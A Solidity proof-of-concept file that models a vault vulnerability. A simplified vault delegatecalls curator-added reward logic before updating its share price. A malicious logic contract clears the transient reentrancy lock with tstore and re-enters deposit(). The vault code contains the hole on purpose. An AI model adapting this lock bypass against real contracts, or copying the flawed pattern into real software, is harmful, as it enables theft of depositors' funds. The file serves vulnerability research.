// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/console.sol";

/// @dev Simplified SiloVault that reproduces the vulnerable pattern
/// Real SiloVault: silo-vaults/contracts/SiloVault.sol
contract SimplifiedSiloVault {
    bool transient _lock;

    // ERC4626-like state
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;
    uint256 public lastTotalAssets; // Updated during _deposit/_withdraw

    // Incentives claiming logic (delegatecall targets)
    address[] public claimingLogics;
    address public curator;

    event Deposit(address indexed user, uint256 assets, uint256 sharesMinted);
    event Reentered(address indexed attacker, uint256 extraShares);

    constructor() {
        curator = msg.sender;
    }

    modifier nonReentrant() {
        require(!_lock, "ReentrancyGuard: locked");
        _lock = true;
        _;
        _lock = false;
    }

    /// @dev Curator can add claiming logic (simplified — real vault has trusted factory path)
    function addClaimingLogic(address logic) external {
        require(msg.sender == curator, "only curator");
        claimingLogics.push(logic);
    }

    /// @dev Seed vault with initial assets (simulates existing deposits)
    function seed(uint256 _assets) external {
        totalAssets += _assets;
        totalShares += _assets; // 1:1 initial ratio
        shares[msg.sender] += _assets;
        lastTotalAssets = totalAssets;
    }

    /// @dev Deposit assets, get shares. Protected by transient reentrancy guard.
    /// Reproduces SiloVault.deposit() -> _deposit() -> _update() -> _claimRewards()
    function deposit(uint256 assets, address receiver) external nonReentrant returns (uint256 sharesMinted) {
        // _update() equivalent — calls _claimRewards BEFORE updating lastTotalAssets
        _claimRewards();

        // Calculate shares based on STALE lastTotalAssets
        // Real vault: shares = assets * totalSupply / lastTotalAssets
        if (totalShares == 0 || lastTotalAssets == 0) {
            sharesMinted = assets;
        } else {
            sharesMinted = assets * totalShares / lastTotalAssets;
        }

        // Mint shares
        shares[receiver] += sharesMinted;
        totalShares += sharesMinted;
        totalAssets += assets;

        // Update lastTotalAssets AFTER share calculation
        lastTotalAssets = totalAssets;

        emit Deposit(receiver, assets, sharesMinted);
    }

    /// @dev Simulate _claimRewards() — uses delegatecall like real SiloVault
    function _claimRewards() internal {
        for (uint256 i = 0; i < claimingLogics.length; i++) {
            (bool success,) = claimingLogics[i].delegatecall(
                abi.encodeWithSignature("claimRewardsAndDistribute()")
            );
            if (!success) revert("ClaimRewardsFailed");
        }
    }

    /// @dev View: convert shares to assets
    function convertToAssets(uint256 _shares) external view returns (uint256) {
        if (totalShares == 0) return 0;
        return _shares * totalAssets / totalShares;
    }
}

/// @dev Malicious claiming logic that exploits delegatecall + transient storage
contract MaliciousClaimingLogic {
    address public attacker;
    bool private _exploited;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /// @dev Called via delegatecall from SiloVault._claimRewards()
    /// Executes in SiloVault's storage context (including transient storage)
    function claimRewardsAndDistribute() external {
        // Step 1: Clear the transient reentrancy lock
        // Solidity 0.8.28 transient bool _lock is at transient slot 0
        assembly {
            tstore(0, 0) // Clear _lock
        }

        console.log("[EXPLOIT] Transient lock cleared via tstore(0, 0)");

        // Step 2: Re-enter deposit() with a large amount
        // Since we're in delegatecall context, address(this) == SiloVault
        // The lock is cleared, so deposit() will succeed
        //
        // The key insight: lastTotalAssets hasn't been updated yet,
        // so the share price is based on stale data. If we can inflate
        // totalAssets before the legitimate deposit completes, we get
        // more shares than we should.

        // Re-enter deposit
        uint256 attackAmount = 1000 ether; // Attacker's deposit
        address self = address(this); // == SiloVault in delegatecall context

        console.log("[EXPLOIT] Re-entering deposit()...");
        (bool success,) = self.call(
            abi.encodeWithSignature(
                "deposit(uint256,address)",
                attackAmount,
                // We need the attacker address but can't use storage in delegatecall context
                // Use a hardcoded address or pass via calldata
                address(uint160(uint256(keccak256("attacker"))))
            )
        );

        if (success) {
            console.log("[EXPLOIT] Reentrancy deposit SUCCEEDED!");
        } else {
            console.log("[EXPLOIT] Reentrancy deposit FAILED");
        }
    }
}
